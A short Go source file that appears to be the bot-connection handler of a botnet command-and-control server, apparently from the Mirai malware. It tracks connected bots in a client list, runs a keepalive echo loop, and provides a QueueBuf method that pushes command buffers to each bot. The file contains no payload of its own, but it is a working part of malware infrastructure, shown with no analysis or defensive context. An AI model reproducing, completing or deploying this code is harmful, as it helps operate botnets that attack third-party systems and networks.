package main

import (
	"net"
	"time"
)

type Bot struct {
	uid     int
	conn    net.Conn
	version byte
	source  string
}

func NewBot(conn net.Conn, version byte, source string) *Bot {
	return &Bot{-1, conn, version, source}
}

func (b *Bot) Handle() {
	clientList.AddClient(b)
	defer clientList.DelClient(b)

	buf := make([]byte, 2)
	for {
		err := b.conn.SetDeadline(time.Now().Add(180 * time.Second))
		if err != nil {
			return
		}
		if n, err := b.conn.Read(buf); err != nil || n != len(buf) {
			return
		}
		if n, err := b.conn.Write(buf); err != nil || n != len(buf) {
			return
		}
	}
}

func (b *Bot) QueueBuf(buf []byte) {
	_, err := b.conn.Write(buf)
	if err != nil {
		return
	}
}
